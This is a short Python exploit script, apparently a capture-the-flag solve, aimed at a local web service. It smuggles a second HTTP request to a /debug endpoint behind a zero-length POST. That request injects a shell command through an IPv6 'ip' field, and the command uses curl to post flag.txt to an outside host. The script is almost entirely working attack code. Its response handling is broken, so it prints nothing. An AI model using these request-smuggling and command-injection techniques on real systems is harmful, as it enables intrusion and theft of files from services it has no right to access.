import socket

host = "127.0.0.1"
port = 3003

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))

cmd = """{"ip": "fe80::1%;curl -X POST --data-binary @flag.txt ty.5-4.cc"}"""

exploit = (
    f"POST /debug HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    f"Connection: keep-alive\r\n"
    f"Content-Type: application/json\r\n"
    f"Content-Length: {len(cmd)}\r\n"
    f"\r\n"
    f"{cmd}"
)


req = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    f"Connection: keep-alive\r\n"
    f"Content-Length: 0\r\n"
    f"\r\n"
    f"{exploit}"
)


s.sendall(req.encode())

response = b""
data = s.recv(10)
if not data:
    response += data

print(response.decode(errors="ignore"))

s.close()